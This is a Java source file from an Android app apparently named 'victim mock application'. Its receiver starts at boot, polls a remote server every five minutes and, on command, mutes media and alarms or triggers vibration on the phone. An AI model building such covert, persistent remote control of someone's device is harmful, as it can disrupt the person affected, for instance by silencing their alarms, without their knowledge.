package com.qstpss.victimmockapplication;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.StrictMode;

import com.qstpss.victimmockapplication.mocks.MuteMedia;
import com.qstpss.victimmockapplication.mocks.Vibration;
import com.qstpss.victimmockapplication.model.MockEvent;
import com.qstpss.victimmockapplication.model.Status;
import com.qstpss.victimmockapplication.model.Type;
import com.qstpss.victimmockapplication.webclient.ClientImpl;
import com.qstpss.victimmockapplication.webclient.IClient;

import java.io.IOException;
import java.util.List;
import java.util.stream.Collectors;

import retrofit2.Call;
import retrofit2.Response;

public class AlarmManagerBroadcastReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        String bootAction = "android.intent.action.BOOT_COMPLETED";
        if (action != null && action.equalsIgnoreCase(bootAction)) {
            Intent intent2 = new Intent(context, AlarmManagerBroadcastReceiver.class);
            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 1, intent2, PendingIntent.FLAG_CANCEL_CURRENT);
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            alarmManager.cancel(pendingIntent);

            int repeatInterval = 1000 * 60 * 5;
            long startTime = System.currentTimeMillis();
            alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, startTime, repeatInterval, pendingIntent);

        } else {
            allowToExecuteInMainThread();
            IClient client = new ClientImpl();
            Call<List<MockEvent>> startedEvents;
            try {
                startedEvents = client.getStartedEvents();
            } catch (IOException e) {
                return;
            }
            Response response = client.getResponse();
            if (response.isSuccessful()) {
                processActiveEvents(response, context);
            }
        }

    }

    private void processActiveEvents(Response response, Context context) {
        List<MockEvent> body = (List<MockEvent>) response.body();
        body.stream()
                .filter(mockEvent -> mockEvent.getStatus() == Status.PENDING)
                .forEach(mockEvent -> doMock(context, mockEvent));
        disableMocks(body);
    }

    private void doMock(Context context, MockEvent mockEvent) {
        IClient client = new ClientImpl();
        try {
            client.startMockEvent(mockEvent);
        } catch (IOException e) {
            return;
        }
        if (client.getResponse().isSuccessful()) {
            switch (mockEvent.getType()) {
                case MUTE_MEDIA:
                case MUTE_ALARM:
                    MuteMedia.MOCK.startMock(context);
                    break;
                case VIBRATION:
                    Vibration.MOCK.startMock(context);
                    break;
            }
        }
    }

    private void disableMocks(List<MockEvent> body) {
        List<Type> mockTypes =
                body.stream()
                        .map(MockEvent::getType)
                        .collect(Collectors.toList());
        //TODO if we disable all mock on host application and then unmute media we can't stop previous this type mock

        if (!mockTypes.contains(Type.VIBRATION)) {
            Vibration.MOCK.stopMock();
        }
        if (!mockTypes.contains(Type.MUTE_MEDIA)) {
            MuteMedia.MOCK.stopMock();
        }
    }

    private void allowToExecuteInMainThread() {
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
                .permitAll().build();
        StrictMode.setThreadPolicy(policy);
    }
}
